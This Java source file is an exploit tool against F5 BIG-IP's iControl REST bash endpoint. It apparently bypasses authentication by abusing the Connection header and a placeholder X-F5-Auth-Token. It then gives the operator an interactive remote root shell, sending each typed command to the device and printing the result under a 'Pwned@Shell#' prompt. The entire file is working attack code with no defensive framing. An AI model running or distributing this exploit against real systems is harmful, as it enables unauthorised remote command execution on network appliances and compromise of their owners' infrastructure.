import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Scanner;

public class getShell {

	private String target;
	private static String line = null;
	private static String command;
	private static final String endPoint = "mgmt/tm/util/bash";

	public getShell(String target) {
		this.target = target;
	}

	public void pwnShell() throws IOException {
		if (!this.target.endsWith("/")) {
			this.target = this.target + "/" + endPoint;
		} else if (this.target.endsWith("/")) {
			this.target = this.target + endPoint;
		}
		System.out.println("[+] Type exit to quiet the shell\n");

		while (true) {
			try {
				System.out.print("Pwned@Shell# ");
				Scanner scanner = new Scanner(System.in);
				command = scanner.nextLine();
				scanner.close();
				System.out.println("");
				if (command.equals("exit") || command.equals("Exit")) {
					System.out.println("[+] Bye !");
					System.exit(0);
				} else {
					URL obj = new URL(this.target);
					HttpURLConnection con = (HttpURLConnection) obj.openConnection();
					con.setDoOutput(true);
					con.setDoInput(true);
					con.setRequestProperty("Accept", "*/*");
					con.setRequestProperty("Connection",
							"close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host");
					con.setRequestProperty("Content-Type", "application/json");
					con.setRequestProperty("X-F5-Auth-Token", "anything");
					con.setRequestProperty("Authorization", "Basic YWRtaW46");
					con.setRequestMethod("POST");
					OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
					wr.write(JSON.HMQ(new HashMap<String, String>() {
						{
							put("command", "run");
							put("utilCmdArgs", "-c '" + command + "'");
						}
					}));
					wr.flush();

					StringBuilder sB = new StringBuilder();
					BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
					while ((line = br.readLine()) != null) {
						sB.append(line + "\n");

					}
					br.close();
					String responseParsing = sB.toString();

					String finalResult = JSON.QHM(responseParsing).get("commandResult");
					System.out.println("[+] Executing " + command + " command:");
					System.out.println(finalResult);
					System.out.println("");
				}

			} catch (Exception e) {
				System.out.println("[-] Error: " + e);
				System.exit(0);

			}
		}

	}
}
